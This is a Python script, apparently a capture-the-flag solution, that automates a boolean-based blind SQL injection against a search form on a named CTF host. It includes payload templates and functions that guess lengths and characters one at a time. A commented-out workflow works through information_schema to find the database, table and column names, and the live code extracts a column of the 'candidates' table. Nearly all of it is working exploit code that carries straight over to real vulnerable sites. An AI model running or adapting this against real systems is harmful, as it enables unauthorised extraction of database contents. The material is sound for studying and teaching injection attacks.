#!/usr/bin/env python

import requests
import string
from pwn import log

url = "http://president.sctf.michaelz.xyz/index.php"
post = requests.post
payloadLength = "' OR LENGTH({})={} OR 'a'='b"
payloadContent = "' OR SUBSTR({}, {}, 1)='{}' OR 'a'='b"
SUCCESS = "max-width:50px;max-height:50px;"

def guessContent(query, length, charset=string.lowercase + string.punctuation): 
    name = ""
    prompt = log.progress("Try payload")
    charset = string.lowercase + string.punctuation
    count = 0
    while len(name) < length:
        for c in charset:
            count += 1
            if count >= len(charset):
                prompt.failure(name)
                assert False, "GG"
                break
            if c == '\'' or c == "\\":
                tmp = name + '\\' + c
                payload = payloadContent.format(query, len(tmp)-1, c)
            else:
                tmp = name + c
                payload = payloadContent.format(query, len(tmp), c)
            prompt.status(payload)
            r = post(url, data = {"search": payload})
            if SUCCESS in r.text:
                count = 0
                name = tmp
                break
    prompt.success(payload)
    return name

def guessLength(query, start = 0, end = 100):
    prompt = log.progress("Try payload")
    for i in range(start, end):
        payload = payloadLength.format(query, i)
        prompt.status(payload)
        r = post(url, data = {"search": payload})
        if SUCCESS in r.text:
            prompt.success(payload)
            return i
    prompt.failure("Fail!")

"""
# break database
query = "database()"
l = guessLength(query)
log.info("DB length: " + str(l))
dbname = guessContent(query, l)
log.info("DB name: " + dbname) # sctf_injection

# break table
query = "(SELECT table_name FROM information_schema.tables WHERE table_schema='sctf_injection' LIMIT 0,1)"
l = guessLength(query)
log.info("table length: " + str(l))
table = guessContent(query, l)
log.info("table name: " + table) # candidates

# break column
query = "(SELECT column_name FROM information_schema.columns WHERE table_name='candidates' LIMIT 6,1)"
l = guessLength(query)
log.info("column length: " + str(l))
column = guessContent(query, l, charset=string.printable)
log.info("column name: " + column) 
# id, hide, last, first, party, pic, comment
"""

# break data
column = "comment"
query = "(SELECT {} FROM candidates LIMIT 1,1)".format(column, end = 100)
l = guessLength(query)
log.info("data length: " + str(l))
data = guessContent(query, l, charset=string.printable)
log.info("data name: " + data)
